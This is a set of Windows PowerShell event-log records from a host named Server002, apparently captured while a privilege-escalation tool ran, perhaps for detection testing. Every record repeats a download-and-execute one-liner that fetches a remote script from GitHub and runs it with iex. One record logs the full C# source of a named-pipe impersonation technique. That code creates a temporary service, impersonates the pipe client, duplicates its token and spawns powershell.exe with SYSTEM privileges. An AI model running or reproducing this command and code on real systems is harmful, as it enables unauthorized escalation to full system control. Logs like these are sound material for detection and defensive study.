{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:47.6326858"},"EventRecordID":"1043","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=544c78b6-b2dc-46a7-b3e2-d5c9aa83f5f4\r\n\tHostApplication=powershell.exe &amp; {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:47.6356613"},"EventRecordID":"1044","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=544c78b6-b2dc-46a7-b3e2-d5c9aa83f5f4\r\n\tHostApplication=powershell.exe &amp; {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:47.6384099"},"EventRecordID":"1045","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=544c78b6-b2dc-46a7-b3e2-d5c9aa83f5f4\r\n\tHostApplication=powershell.exe &amp; {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:47.6875455"},"EventRecordID":"1046","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=544c78b6-b2dc-46a7-b3e2-d5c9aa83f5f4\r\n\tHostApplication=powershell.exe &amp; {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:47.6875455"},"EventRecordID":"1047","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=544c78b6-b2dc-46a7-b3e2-d5c9aa83f5f4\r\n\tHostApplication=powershell.exe &amp; {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:47.6875455"},"EventRecordID":"1048","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=544c78b6-b2dc-46a7-b3e2-d5c9aa83f5f4\r\n\tHostApplication=powershell.exe &amp; {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:47.8882126"},"EventRecordID":"1049","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=544c78b6-b2dc-46a7-b3e2-d5c9aa83f5f4\r\n\tHostApplication=powershell.exe &amp; {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=fc2ae53a-e9d2-42b5-9794-db094d53aee6\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"800"},"Version":"0","Level":"4","Task":"8","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:49.6914610"},"EventRecordID":"1050","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Add-Type -TypeDefinition $NamedPipeSystem\r\n, \tDetailSequence=1\r\n\tDetailTotal=2\r\n\r\n\tSequenceNumber=15\r\n\r\n\tUserId=SERVER002\\admin_test\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=544c78b6-b2dc-46a7-b3e2-d5c9aa83f5f4\r\n\tHostApplication=powershell.exe &amp; {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=fc2ae53a-e9d2-42b5-9794-db094d53aee6\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=Add-Type -TypeDefinition $NamedPipeSystem\r\n, CommandInvocation(Add-Type): \"Add-Type\"\r\n","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"800"},"Version":"0","Level":"4","Task":"8","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:08:49.6914610"},"EventRecordID":"1051","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Add-Type -TypeDefinition $NamedPipeSystem\r\n, \tDetailSequence=2\r\n\tDetailTotal=2\r\n\r\n\tSequenceNumber=15\r\n\r\n\tUserId=SERVER002\\admin_test\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=544c78b6-b2dc-46a7-b3e2-d5c9aa83f5f4\r\n\tHostApplication=powershell.exe &amp; {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=fc2ae53a-e9d2-42b5-9794-db094d53aee6\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=Add-Type -TypeDefinition $NamedPipeSystem\r\n, ParameterBinding(Add-Type): name=\"TypeDefinition\"; value=\"using System;\r\nusing System.IO;\r\nusing System.Text;\r\nusing System.IO.Pipes;\r\nusing System.Threading;\r\nusing System.Diagnostics;\r\nusing System.Security.Principal;\r\nusing System.Security.AccessControl;\r\nusing System.Runtime.InteropServices;\r\nusing System.ComponentModel;\r\n\r\n\r\nnamespace HighPrivs\r\n{\r\n    public class GetSystem\r\n    {\r\n        public class ServiceHelper\r\n        {\r\n            public static bool CreateNewService()\r\n            {\r\n                try\r\n                {\r\n                    Console.WriteLine(\"[*] Starting Pipe Client Service.\");\r\n                    System.Diagnostics.Process process = new System.Diagnostics.Process();\r\n                    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();\r\n                    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;\r\n                    startInfo.FileName = \"powershell.exe\";\r\n                    startInfo.Arguments = @\" -c New-Service -Name svcHighPriv -BinaryPathName 'C:\\windows\\system32\\cmd.exe /C echo Uuup! &gt; \\\\.\\pipe\\HighPriv' -StartupType Manual\";\r\n                    process.StartInfo = startInfo;\r\n                    process.Start();\r\n                    Thread.Sleep(3000);\r\n                    startInfo.FileName = \"powershell.exe\";\r\n                    startInfo.Arguments = @\" -c Start-Service -Name svcHighPriv\";\r\n                    process.StartInfo = startInfo;\r\n                    process.Start();\r\n                    Thread.Sleep(2000);\r\n                    startInfo.FileName = \"cmd.exe\";\r\n                    startInfo.Arguments = @\" /C sc.exe delete svcHighPriv\";\r\n                    process.StartInfo = startInfo;\r\n                    process.Start();\r\n                    Console.WriteLine(\"[*] Removed Pipe Service successfully.\");\r\n\r\n                    return true;\r\n                }\r\n                catch\r\n                {\r\n                    return false;\r\n                }\r\n            }\r\n        }\r\n\r\n\r\n        public class NamedPipeServerHelper\r\n        {\r\n            public enum TOKEN_ACCESS : uint\r\n            {\r\n                STANDARD_RIGHTS_REQUIRED = 0x000F0000,\r\n                STANDARD_RIGHTS_READ = 0x00020000,\r\n                TOKEN_ASSIGN_PRIMARY = 0x0001,\r\n                TOKEN_DUPLICATE = 0x0002,\r\n                TOKEN_IMPERSONATE = 0x0004,\r\n                TOKEN_QUERY = 0x0008,\r\n                TOKEN_QUERY_SOURCE = 0x0010,\r\n                TOKEN_ADJUST_PRIVILEGES = 0x0020,\r\n                TOKEN_ADJUST_GROUPS = 0x0040,\r\n                TOKEN_ADJUST_DEFAULT = 0x0080,\r\n                TOKEN_ADJUST_SESSIONID = 0x0100,\r\n                TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY),\r\n                TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |\r\n                                    TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |\r\n                                    TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |\r\n                                    TOKEN_ADJUST_SESSIONID)\r\n            }\r\n\r\n            [StructLayout(LayoutKind.Sequential)]\r\n            public struct SECURITY_ATTRIBUTES\r\n            {\r\n                public int nLength;\r\n                public IntPtr lpSecurityDescriptor;\r\n                public int bInheritHandle;\r\n            }\r\n\r\n            public enum SECURITY_IMPERSONATION_LEVEL\r\n            {\r\n                SecurityAnonymous,\r\n                SecurityIdentification,\r\n                SecurityImpersonation,\r\n                SecurityDelegation\r\n            }\r\n\r\n            public enum TOKEN_TYPE\r\n            {\r\n                TokenPrimary = 1,\r\n                TokenImpersonation\r\n            }\r\n\r\n            public enum TOKEN_INFORMATION_CLASS\r\n            {\r\n                TokenUser = 1,\r\n                TokenGroups,\r\n                TokenPrivileges,\r\n                TokenOwner,\r\n                TokenPrimaryGroup,\r\n                TokenDefaultDacl,\r\n                TokenSource,\r\n                TokenType,\r\n                TokenImpersonationLevel,\r\n                TokenStatistics,\r\n                TokenRestrictedSids,\r\n                TokenSessionId,\r\n                TokenGroupsAndPrivileges,\r\n                TokenSessionReference,\r\n                TokenSandBoxInert,\r\n                TokenAuditPolicy,\r\n                TokenOrigin,\r\n                TokenElevationType,\r\n                TokenLinkedToken,\r\n                TokenElevation,\r\n                TokenHasRestrictions,\r\n                TokenAccessInformation,\r\n                TokenVirtualizationAllowed,\r\n                TokenVirtualizationEnabled,\r\n                TokenIntegrityLevel,\r\n                TokenUIAccess,\r\n                TokenMandatoryPolicy,\r\n                TokenLogonSid,\r\n                MaxTokenInfoClass\r\n            }\r\n\r\n            [Flags]\r\n            public enum CreateProcessFlags : uint\r\n            {\r\n                CREATE_BREAKAWAY_FROM_JOB = 0x01000000,\r\n                CREATE_DEFAULT_ERROR_MODE = 0x04000000,\r\n                DEBUG_PROCESS = 0x00000001,\r\n                DEBUG_ONLY_THIS_PROCESS = 0x00000002,\r\n                CREATE_SUSPENDED = 0x00000004,\r\n                DETACHED_PROCESS = 0x00000008,\r\n                CREATE_NEW_CONSOLE = 0x00000010,\r\n                NORMAL_PRIORITY_CLASS = 0x00000020,\r\n                CREATE_NEW_PROCESS_GROUP = 0x00000200,\r\n                CREATE_NO_WINDOW = 0x08000000,\r\n                CREATE_PROTECTED_PROCESS = 0x00040000,\r\n                CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,\r\n                CREATE_SEPARATE_WOW_VDM = 0x00000800,\r\n                CREATE_SHARED_WOW_VDM = 0x00001000,\r\n                CREATE_UNICODE_ENVIRONMENT = 0x00000400,\r\n                EXTENDED_STARTUPINFO_PRESENT = 0x00080000,\r\n                INHERIT_PARENT_AFFINITY = 0x00010000\r\n            }\r\n\r\n            [Flags]\r\n            public enum LogonFlags\r\n            {\r\n                LOGON_WITH_PROFILE = 0x00000001,\r\n                LOGON_NETCREDENTIALS_ONLY = 0x00000002\r\n            }\r\n\r\n            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]\r\n            public struct STARTUPINFO\r\n            {\r\n                public Int32 cb;\r\n                public string lpReserved;\r\n                public string lpDesktop;\r\n                public string lpTitle;\r\n                public Int32 dwX;\r\n                public Int32 dwY;\r\n                public Int32 dwXSize;\r\n                public Int32 dwYSize;\r\n                public Int32 dwXCountChars;\r\n                public Int32 dwYCountChars;\r\n                public Int32 dwFillAttribute;\r\n                public Int32 dwFlags;\r\n                public Int16 wShowWindow;\r\n                public Int16 cbReserved2;\r\n                public IntPtr lpReserved2;\r\n                public IntPtr hStdInput;\r\n                public IntPtr hStdOutput;\r\n                public IntPtr hStdError;\r\n            }\r\n\r\n            [StructLayout(LayoutKind.Sequential)]\r\n            public struct PROCESS_INFORMATION\r\n            {\r\n                public IntPtr hProcess;\r\n                public IntPtr hThread;\r\n                public int dwProcessId;\r\n                public int dwThreadId;\r\n            }\r\n\r\n            [DllImport(\"advapi32.dll\", SetLastError = true)]\r\n            [return: MarshalAs(UnmanagedType.Bool)]\r\n            public static extern bool ImpersonateNamedPipeClient(\r\n                IntPtr hNamedPipe);\r\n\r\n            [DllImport(\"advapi32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\r\n            public static extern bool RevertToSelf();\r\n\r\n            [DllImport(\"kernel32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\r\n            public static extern bool CloseHandle(\r\n                IntPtr handle);\r\n\r\n            [DllImport(\"kernel32.dll\", SetLastError = true)]\r\n            public static extern IntPtr GetCurrentThread();\r\n\r\n            [DllImport(\"advapi32.dll\", SetLastError = true)]\r\n            public static extern bool OpenThreadToken(\r\n                IntPtr ThreadHandle,\r\n                TOKEN_ACCESS DesiredAccess,\r\n                bool OpenAsSelf,\r\n                out IntPtr TokenHandle);\r\n\r\n            [DllImport(\"advapi32.dll\", SetLastError = true)]\r\n            public static extern bool SetThreadToken(\r\n                IntPtr pHandle,\r\n                IntPtr hToken);\r\n\r\n            [DllImport(\"advapi32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\r\n            public static extern bool DuplicateTokenEx(\r\n                IntPtr hExistingToken,\r\n                TOKEN_ACCESS dwDesiredAccess,\r\n                ref SECURITY_ATTRIBUTES lpTokenAttributes,\r\n                SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,\r\n                TOKEN_TYPE TokenType,\r\n                out IntPtr phNewToken);\r\n\r\n            [DllImport(\"Kernel32.dll\", SetLastError = true)]\r\n            [return: MarshalAs(UnmanagedType.U4)]\r\n            public static extern UInt32 WTSGetActiveConsoleSessionId();\r\n\r\n            [DllImport(\"advapi32.dll\", SetLastError = true)]\r\n            public static extern Boolean SetTokenInformation(\r\n                IntPtr TokenHandle,\r\n                TOKEN_INFORMATION_CLASS TokenInformationClass,\r\n                ref UInt32 TokenInformation,\r\n                UInt32 TokenInformationLength);\r\n\r\n            [DllImport(\"userenv.dll\", SetLastError = true)]\r\n            public static extern bool CreateEnvironmentBlock(\r\n                out IntPtr lpEnvironment,\r\n                IntPtr hToken,\r\n                bool bInherit);\r\n\r\n            [DllImport(\"userenv.dll\", SetLastError = true)]\r\n            [return: MarshalAs(UnmanagedType.Bool)]\r\n            public static extern bool DestroyEnvironmentBlock(\r\n                IntPtr lpEnvironment);\r\n\r\n            [DllImport(\"advapi32\", SetLastError = true, CharSet = CharSet.Unicode)]\r\n            public static extern bool CreateProcessWithTokenW(\r\n                IntPtr hToken,\r\n                LogonFlags dwLogonFlags,\r\n                string lpApplicationName,\r\n                string lpCommandLine,\r\n                CreateProcessFlags dwCreationFlags,\r\n                IntPtr lpEnvironment,\r\n                string lpCurrentDirectory,\r\n                [In] ref STARTUPINFO lpStartupInfo,\r\n                out PROCESS_INFORMATION lpProcessInformation);\r\n\r\n\r\n            public static void NamedPipeServer(object data)\r\n            {\r\n                // Create a Named Pipe to send or receive data\r\n                PipeSecurity ps = new PipeSecurity();\r\n                SecurityIdentifier everyoneSid = new SecurityIdentifier(WellKnownSidType.WorldSid, null);\r\n                string everyone = everyoneSid.Translate(typeof(System.Security.Principal.NTAccount)).ToString();\r\n                Console.WriteLine(\"[!] Pipe accessible for group\" + everyone);\r\n                ps.AddAccessRule(new PipeAccessRule(everyone, PipeAccessRights.ReadWrite, AccessControlType.Allow));\r\n                NamedPipeServerStream pipeServer = new NamedPipeServerStream(\r\n                                                    \"HighPriv\",\r\n                                                    PipeDirection.InOut,\r\n                                                    dwThreadCount,\r\n                                                    PipeTransmissionMode.Byte,\r\n                                                    PipeOptions.None,\r\n                                                    1024,\r\n                                                    1024,\r\n                                                    ps);\r\n\r\n                IntPtr PipeHandle = pipeServer.SafePipeHandle.DangerousGetHandle();\r\n                if (PipeHandle == IntPtr.Zero)\r\n                {\r\n                    Console.WriteLine(\"[!] Failed to create outbound Pipe instance.\");\r\n                    return;\r\n                }\r\n\r\n                Console.WriteLine(\"[*] Waiting for a client to connect to the Pipe.\");\r\n\r\n                // This call blocks until a client process connects to the Pipe\r\n                pipeServer.WaitForConnection();\r\n\r\n                int threadId = Thread.CurrentThread.ManagedThreadId;\r\n                Console.WriteLine(\"[*] Pipe Client connected on thread ID: {0} -&gt; Reading data from the Pipe.\", threadId);\r\n\r\n                // Create a StreamReader so we can Read from the Named Pipe\r\n                StreamReader pipeStreamReader = new StreamReader(pipeServer);\r\n                string readFromPipe = pipeStreamReader.ReadLine();\r\n\r\n                if (readFromPipe == null)\r\n                {\r\n                    Console.WriteLine(\"[*] Failed to read data from the Pipe.\");\r\n                    return;\r\n                }\r\n\r\n                Console.WriteLine(\"[*] Number of bytes read: {0}\", Encoding.ASCII.GetByteCount(readFromPipe) + 2);\r\n                Console.WriteLine(\"[*] Our buffer contains: {0}\\n\", readFromPipe);\r\n\r\n                // Impersonate the Client.\r\n                if (!ImpersonateNamedPipeClient(PipeHandle))\r\n                {\r\n                    Console.WriteLine(\"[!] Failed to Impersonate client, error: {0}\", Marshal.GetLastWin32Error());\r\n                }\r\n\r\n                Console.WriteLine(\"[*] Impersonate Named Pipe Client.\");\r\n\r\n                // Get an impersonation token with the client's security context.\r\n                IntPtr hToken = IntPtr.Zero;\r\n                if (!OpenThreadToken(GetCurrentThread(), TOKEN_ACCESS.TOKEN_ALL_ACCESS, true, out hToken))\r\n                    Console.WriteLine(\"[!] Failed to get Token, error: {0}\", Marshal.GetLastWin32Error());\r\n\r\n                Console.WriteLine(\"[*] Get Impersonation Token.\");\r\n\r\n                // Create an Primary token from our impersonation token\r\n                SECURITY_ATTRIBUTES lpSecurityAttributes = new SECURITY_ATTRIBUTES();\r\n                lpSecurityAttributes.nLength = Marshal.SizeOf(lpSecurityAttributes);\r\n                IntPtr hPrimaryToken = IntPtr.Zero;\r\n\r\n                bool result = DuplicateTokenEx(\r\n                    hToken,\r\n                    TOKEN_ACCESS.TOKEN_ALL_ACCESS,\r\n                    ref lpSecurityAttributes,\r\n                    SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,\r\n                    TOKEN_TYPE.TokenPrimary,\r\n                    out hPrimaryToken);\r\n\r\n                if (hPrimaryToken == IntPtr.Zero)\r\n                {\r\n                    Console.WriteLine(\"[*] Failed Duplicating the Token.\");\r\n                    return;\r\n                }\r\n\r\n                Console.WriteLine(\"[*] Create a Primary Token from our Impersonation Token.\");\r\n\r\n                // Modify token SessionId field to spawn a interactive Processes on the current desktop \r\n                uint sessionId = WTSGetActiveConsoleSessionId();\r\n                if (!SetTokenInformation(hPrimaryToken,\r\n                        TOKEN_INFORMATION_CLASS.TokenSessionId,\r\n                        ref sessionId,\r\n                        sizeof(UInt32)))\r\n                {\r\n                    Console.WriteLine(\"[*] Failed to Modify token SessionId.\");\r\n                    return;\r\n                }\r\n\r\n                // Get all necessary environment variables of logged in user to pass them to the process\r\n                IntPtr lpEnvironment = IntPtr.Zero;\r\n                if (!CreateEnvironmentBlock(out lpEnvironment, hPrimaryToken, true))\r\n                {\r\n                    Console.WriteLine(\"[*] Failed to create EnvironmentBlock.\");\r\n                    return;\r\n                }\r\n\r\n                // Start Process with our New token\r\n                PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();\r\n                STARTUPINFO startupInfo = new STARTUPINFO();\r\n                const int SW_SHOW = 5;\r\n                string szCommandLine = \"powershell.exe\";\r\n\r\n                startupInfo.cb = Marshal.SizeOf(startupInfo);\r\n                startupInfo.lpDesktop = \"Winsta0\\\\default\";\r\n                startupInfo.wShowWindow = SW_SHOW;\r\n\r\n                if (!CreateProcessWithTokenW(\r\n                    hPrimaryToken,\r\n                    LogonFlags.LOGON_WITH_PROFILE,\r\n                    null,\r\n                    szCommandLine,\r\n                    CreateProcessFlags.NORMAL_PRIORITY_CLASS | CreateProcessFlags.CREATE_NEW_CONSOLE | CreateProcessFlags.CREATE_UNICODE_ENVIRONMENT,\r\n                    lpEnvironment,\r\n                    null,\r\n                    ref startupInfo,\r\n                    out processInfo))\r\n                {\r\n                    Console.WriteLine(\"[!] Failed to Create Process, error: {0}\", Marshal.GetLastWin32Error());\r\n                }\r\n\r\n                // Destroy Environment Block\r\n                DestroyEnvironmentBlock(lpEnvironment);\r\n\r\n                // End impersonation of client\r\n                RevertToSelf();\r\n\r\n                //Close Token Handles\r\n                CloseHandle(hPrimaryToken);\r\n                CloseHandle(hToken);\r\n\r\n                // Close the pipe (automatically disconnects client too)\r\n                pipeServer.Close();\r\n\r\n                return;\r\n            }\r\n        }\r\n\r\n        private static int dwThreadCount = 1;\r\n\r\n        public static void NamedPipeSystem()\r\n        {\r\n            Console.WriteLine(@\"  _______                            ._____________.__                _________               __                        \");     \r\n            Console.WriteLine(@\" \\      \\ _____    _____   ____   __| _/\\______   \\__|_____   ____  /   _____/__.__. _______/  |_  ____   _____         \");\r\n            Console.WriteLine(@\" /   |   \\\\__  \\  /     \\_/ __ \\ / __ |  |     ___/  \\____ \\_/ __ \\ \\_____  &lt;   |  |/  ___/\\   __\\/ __ \\ /     \\        \");\r\n            Console.WriteLine(@\"/    |    \\/ __ \\|  Y Y  \\  ___// /_/ |  |    |   |  |  |_&gt; &gt;  ___/ /        \\___  |\\___ \\  |  | \\  ___/|  Y Y  \\       \");\r\n            Console.WriteLine(@\"\\____|__  (____  /__|_|  /\\___  &gt;____ |  |____|   |__|   __/ \\___  &gt;_______  / ____/____  &gt; |__|  \\___  &gt;__|_|  /       \");\r\n            Console.WriteLine(@\"        \\/     \\/      \\/     \\/     \\/              |__|        \\/        \\/\\/         \\/            \\/      \\/        \");\r\n            Console.WriteLine(@\"                                                                                                                        \");\r\n            Console.WriteLine(@\"                                         By S3cur3Th1sSh1t                                                              \");\r\n            Console.WriteLine(@\"                                                                                                                        \");\r\n            Console.WriteLine(@\"                                                                                                                        \");\r\n            if (!WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid))\r\n            {\r\n                Console.ForegroundColor = ConsoleColor.Red;\r\n                Console.WriteLine(\"[!] For NamedPipeSystem you need UAC Elevated Administrator privileges.\\n\");\r\n                Console.ResetColor();\r\n                return;\r\n            }\r\n\r\n            Console.WriteLine(\"[*] Creating an instance of a Named Pipe.\");\r\n\r\n            // Creating a MultiThreaded Named Pipe server (In this case only a single Thread)\r\n            uint i;\r\n            Thread[] pipeServers = new Thread[dwThreadCount];\r\n            for (i = 0; i &lt; dwThreadCount; i++)\r\n            {\r\n                // Create Threads for the Clients\r\n                pipeServers[i] = new Thread(NamedPipeServerHelper.NamedPipeServer);\r\n                pipeServers[i].Start();\r\n\r\n                Console.WriteLine(\"[*] Server Thread with ID: {0} created.\", pipeServers[i].ManagedThreadId);\r\n\r\n                if (pipeServers[i] == null)\r\n                {\r\n                    Console.WriteLine(\"[!] Create Server Thread failed.\");\r\n                    return;\r\n                }\r\n            }\r\n\r\n            \r\n            if (!ServiceHelper.CreateNewService())\r\n            {\r\n                Console.WriteLine(\"[!] Are you sure you have Administrator permission?\");\r\n            }\r\n\r\n            // Waiting for Threads to finish\r\n            Thread.Sleep(2000);\r\n            while (i &gt; 0)\r\n            {\r\n                for (int j = 0; j &lt; dwThreadCount; j++)\r\n                {\r\n                    if (pipeServers[j] != null)\r\n                    {\r\n                        if (pipeServers[j].Join(2000))\r\n                        {\r\n                            Console.WriteLine(\"[*] Server Thread ID: {0} Finished successfully.\", pipeServers[j].ManagedThreadId);\r\n                            pipeServers[j] = null;\r\n                            i--; // Decrement the Thread Watch Count.\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n\r\n            Console.WriteLine(\"\\n[*] Done\\n\");\r\n\r\n            return;\r\n        }\r\n        static void Main(string[] args)\r\n        {\r\n            Console.WriteLine(\"Starting Impersonation Pipe!\");\r\n            NamedPipeSystem();\r\n        }\r\n    }\r\n}\"\r\n","Binary":""}}}
